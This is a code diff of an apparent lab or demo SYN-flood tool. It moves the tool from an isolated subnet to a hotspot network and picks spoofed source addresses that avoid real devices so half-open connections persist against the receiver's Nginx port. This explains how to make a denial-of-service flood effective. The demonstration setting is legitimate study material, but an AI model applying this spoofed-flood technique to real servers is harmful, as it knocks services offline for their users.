@@ -17,16 +17,18 @@ if __package__ in (None, ""):
 from client.packet import build_ipv4_tcp_syn_packet
 
 
-# The lab contains only the sender at .10 and receiver at .20. Reserve the
-# upper half of this isolated subnet for synthetic sources. Keeping the source
-# pool on the receiver's own link avoids reverse-path and routing ambiguity.
-# `hosts()` excludes .128 (network) and .255 (broadcast).
-SOURCE_NETWORK = ipaddress.ip_network("192.168.150.128/25")
+# 2-device hotspot demo on NetworkManager's shared subnet 10.42.0.0/24. The
+# real hosts are gateway .1, server (receiver) .81 and attacker .157. Draw
+# synthetic sources from the .192/26 block (.193-.254), which avoids all three,
+# so a spoofed SYN never carries a real device's address -- otherwise the
+# server's SYN-ACK would reach that real host, which would RST and tear down
+# the half-open slot early. `hosts()` excludes .192 (network) and .255 (broadcast).
+SOURCE_NETWORK = ipaddress.ip_network("10.42.0.192/26")
 SOURCE_IP_ADDRESSES = tuple(SOURCE_NETWORK.hosts())
-# C0 A8 96 14 is 192.168.150.20, the fixed isolated receiver address.
-DESTINATION_IP_BYTES = b"\xC0\xA8\x96\x14"
+# 0A 2A 00 51 is 10.42.0.81, the receiver (server) address.
+DESTINATION_IP_BYTES = b"\x0A\x2A\x00\x51"
 # sendto needs the receiver address as readable text, not as four raw bytes.
-DESTINATION_IP_TEXT = "192.168.150.20"
+DESTINATION_IP_TEXT = "10.42.0.81"
 # 0x0050 is decimal 80, the receiver's Nginx TCP port.
 DESTINATION_PORT = 0x0050
 # Use every non-privileged TCP source port for one synthetic source IP, then
@@ -179,7 +181,7 @@ def main() -> None:
         parser.error(str(error))
 
     signal.signal(signal.SIGTERM, stop_on_signal)
-    print(f"Sending to 192.168.150.20:80 with {arguments.workers} worker(s); Ctrl+C stops sending.", flush=True)
+    print(f"Sending to {DESTINATION_IP_TEXT}:{DESTINATION_PORT} with {arguments.workers} worker(s); Ctrl+C stops sending.", flush=True)
     started_at = time.monotonic()
 
     if arguments.workers == 1:
